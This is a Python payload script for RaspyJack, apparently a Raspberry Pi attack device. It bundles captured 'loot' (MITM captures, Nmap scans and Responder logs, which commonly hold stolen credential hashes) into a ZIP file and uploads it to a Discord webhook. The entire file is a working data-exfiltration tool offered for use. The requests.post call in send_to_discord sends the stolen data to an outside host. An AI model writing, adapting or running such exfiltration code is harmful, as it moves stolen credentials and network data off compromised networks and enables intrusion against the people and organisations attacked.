#!/usr/bin/env python3
"""
RaspyJack *payload* – **Upload Loot to Discord**
================================================
This script gathers:

* everything under the local **loot/** folder, **including** the *MITM/*
  and *Nmap/* sub‑directories;
* every file in **./Responder/logs/**

…bundles them into a single **ZIP archive** and uploads it as an
attachment to a Discord *webhook*.

It follows the same « heavily commented & beginner‑friendly » style as
*example_show_buttons.py* so you can understand and tweak every step.

Usage
-----

1.  Put this file in RaspyJack’s *payloads/* directory.
2.  Edit the ``WEBHOOK_URL`` constant below so it contains **your own** Discord webhook URL.
3.  Run it manually **or** add it to RaspyJack’s menu just like the other payloads.

Discord limits a single upload to **≤ 8 MiB** for standard (non Nitro) accounts.  The script will warn you if the archive is larger.
"""

# ---------------------------------------------------------------------------
# 0) Standard library imports
# ---------------------------------------------------------------------------
import os, sys, io, zipfile, datetime, signal, textwrap
from pathlib import Path          # path handling in an OS‑agnostic way

# ---------------------------------------------------------------------------
# 1) Third‑party dependency – `requests`
# ---------------------------------------------------------------------------
try:
    import requests               # HTTP – pip install requests
except ModuleNotFoundError as exc:
    print("[ERROR] The 'requests' library is missing – install it with:\n    sudo apt install python3-requests",
          file=sys.stderr)
    raise

# ---------------------------------------------------------------------------
# 2) Configuration – tweak these paths if your layout differs
# ---------------------------------------------------------------------------
# (Paths are **relative** to the folder where you launch the script.)
LOOT_DIR       = Path("loot")
MITM_DIR       = LOOT_DIR / "MITM"
NMAP_DIR       = LOOT_DIR / "Nmap"
RESPONDER_DIR  = Path("Responder") / "logs"

WEBHOOK_URL = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxx/YYYYYYYYYYYYY" #<- EDIT ME!

# Discord’s hard attachment cap (bytes) – 8 MiB for free users.
DISCORD_SIZE_LIMIT = 8 * 1024 * 1024

# ---------------------------------------------------------------------------
# 3) Graceful shutdown – allow Ctrl‑C or SIGTERM to stop the script
# ---------------------------------------------------------------------------
running = True

def cleanup(*_):
    global running
    running = False
    print("\n[INFO] Interruption received – cleaning up…")

signal.signal(signal.SIGINT,  cleanup)   # Ctrl‑C
signal.signal(signal.SIGTERM, cleanup)   # kill or RaspyJack quit

# ---------------------------------------------------------------------------
# 4) Helper: recursively add a directory to a ZIP archive
# ---------------------------------------------------------------------------
def add_directory_to_zip(zip_file: zipfile.ZipFile, base_dir: Path, arc_prefix: str="") -> None:
    """Walk *base_dir* and add every file to *zip_file*.

    *arc_prefix* lets us place files under a different *virtual* folder
    inside the archive (handy if several source directories collide).
    """
    for path in base_dir.rglob("*"):
        if path.is_file():
            # Relative path inside the ZIP, e.g. «Responder/logs/foo.txt»
            arcname = os.path.join(arc_prefix, path.relative_to(base_dir.parent).as_posix())
            zip_file.write(path, arcname)

# ---------------------------------------------------------------------------
# 5) Create the ZIP archive in‑memory (BytesIO buffer)
# ---------------------------------------------------------------------------
def build_archive() -> io.BytesIO:
    """Return an in‑memory ZIP containing every required file."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # Add loot/, MITM/ and Nmap/   – preserve existing hierarchy
        if LOOT_DIR.exists():
            add_directory_to_zip(zf, LOOT_DIR)

        # Responder logs go under «Responder/logs/» inside the archive
        if RESPONDER_DIR.exists():
            add_directory_to_zip(zf, RESPONDER_DIR, arc_prefix="Responder/logs")

    buf.seek(0)  # rewind so .read() returns the full archive
    return buf

# ---------------------------------------------------------------------------
# 6) Upload to Discord
# ---------------------------------------------------------------------------
def send_to_discord(archive: io.BytesIO) -> None:
    """POST *archive* to the configured webhook."""

    file_size = archive.getbuffer().nbytes
    if file_size > DISCORD_SIZE_LIMIT:
        print(f"[WARN] Archive is {file_size/1024/1024:.2f} MiB – exceeds Discord’s {DISCORD_SIZE_LIMIT/1024/1024} MiB limit.")
        print("       You can either:")
        print("        • Remove some files; or")
        print("        • Pay for Discord Nitro (larger uploads allowed).  Aborting.")
        return

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"loot_{timestamp}.zip"

    payload = {"content": f"📦 Fresh loot ({timestamp})"}
    files   = {"file": (filename, archive, "application/zip")}

    print("[INFO] Uploading to Discord …", end=" ")
    resp = requests.post(WEBHOOK_URL, data=payload, files=files, timeout=60)

    if resp.status_code == 204:
        print("done ✅")
    else:
        print("failed ❌")
        print(f"[ERROR] Discord responded with {resp.status_code}: {resp.text}")

# ---------------------------------------------------------------------------
# 7) Main routine
# ---------------------------------------------------------------------------
def main() -> None:
    if "discord.com/api/webhooks/xxxxxxxx" in WEBHOOK_URL:
        print(textwrap.dedent("""\
            [ERROR] You forgot to set your own webhook URL!
            Edit WEBHOOK_URL near the top of this script."""))
        sys.exit(1)

    print("[INFO] Building archive …", end=" ")
    archive = build_archive()
    print("done ✔︎")

    if running:            # skip upload if user aborted mid‑way
        send_to_discord(archive)

    print("[INFO] Finished.")

# ---------------------------------------------------------------------------
# 8) Run as a script
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    main()

